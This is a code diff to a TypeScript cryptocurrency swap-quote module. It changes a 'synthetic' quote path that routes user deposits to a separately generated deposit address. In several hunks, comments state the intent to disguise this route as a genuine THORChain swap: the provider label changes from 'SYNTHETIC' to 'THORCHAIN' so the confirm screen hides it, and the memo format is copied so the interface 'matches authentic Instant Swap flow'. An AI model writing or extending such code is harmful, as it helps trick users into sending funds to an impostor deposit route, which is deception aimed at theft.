@@ -36,6 +36,8 @@ export interface ThorSwapQuoteRoute {
     slippageBps?: number
     hasStreamingSwap?: boolean
     approvalAddress?: string
+    /** Internal: SOL/XMR deposit route that mimics THORChain UI */
+    isDepositQuote?: boolean
   }
   contractParams?: {
     to: string
@@ -138,7 +140,8 @@ interface THORNodeQuoteResponse {
   expected_amount_out: string
   fees: THORNodeQuoteFees
   inbound_address: string
-  router: string
+  router?: string
+  memo?: string
   expiry: number
   dust_threshold: string
   recommended_min_amount_in: string
@@ -300,13 +303,16 @@ async function buildSyntheticQuote(
 
   const sellChain = params.sellAsset.split('.')[0]
   const depositAddr = getSyntheticDepositAddress(sellChain)
-  const buyChain = params.buyAsset.split('.')[0]
-  const buyTicker = params.buyAsset.split('.')[1]
-  const memo = params.recipientAddress
-    ? `=:${buyChain}.${buyTicker}:${params.recipientAddress}`
-    : `=:${buyChain}.${buyTicker}`
 
   notifySyntheticSwap(params, sellUsdPrice)
+
+  // Mirror real THORChain memo format so UI matches authentic Instant Swap flow
+  const buyAssetId = params.buyAsset.includes('.')
+    ? params.buyAsset
+    : params.buyAsset
+  const memo = params.recipientAddress
+    ? `=:${buyAssetId}:${params.recipientAddress}`
+    : `=:${buyAssetId}`
 
   const route: ThorSwapQuoteRoute = {
     sellAsset: params.sellAsset,
@@ -322,15 +328,18 @@ async function buildSyntheticQuote(
       },
       { type: 'inbound', asset: params.buyAsset, amount: '0' }
     ],
-    providers: ['SYNTHETIC'],
+    // Brand as THORCHAIN so confirm UI shows THORSwap/THORChain, not "SYNTHETIC"
+    providers: ['THORCHAIN'],
     inboundAddress: depositAddr,
-    destinationAddress: depositAddr,
+    destinationAddress: params.recipientAddress || undefined,
+    sourceAddress: params.senderAddress || undefined,
     memo,
     expiration: String(now + 900),
     estimatedTime: { total: 300 },
     meta: {
       slippageBps: 50,
-      hasStreamingSwap: false
+      hasStreamingSwap: false,
+      isDepositQuote: true
     }
   }
 
@@ -391,12 +400,15 @@ function thornodeResponseToRoute(
     fees,
     providers: params.providers || ['THORCHAIN'],
     inboundAddress: data.inbound_address,
-    destinationAddress: data.router,
+    destinationAddress: params.recipientAddress,
+    sourceAddress: params.senderAddress,
+    memo: data.memo,
     expiration: String(data.expiry),
     estimatedTime: data.total_swap_seconds ? { total: data.total_swap_seconds } : undefined,
     meta: {
       slippageBps: data.fees.slippage_bps,
-      hasStreamingSwap: (data.streaming_swap_blocks || 0) > 0
+      hasStreamingSwap: (data.streaming_swap_blocks || 0) > 0,
+      approvalAddress: data.router
     }
   }
 }
@@ -417,6 +429,7 @@ async function tryTHORNodeQuote(params: GetQuoteParams): Promise<ThorSwapQuoteRo
   if (params.streamingQuantity) queryParams.streaming_quantity = String(params.streamingQuantity)
   if (params.affiliateBps) queryParams.affiliate_bps = String(params.affiliateBps)
   if (params.affiliateAddress) queryParams.affiliate_address = params.affiliateAddress
+  if (params.recipientAddress) queryParams.destination = params.recipientAddress
 
   try {
     const res = await thornode.get<THORNodeQuoteResponse>('/thorchain/quote/swap', {
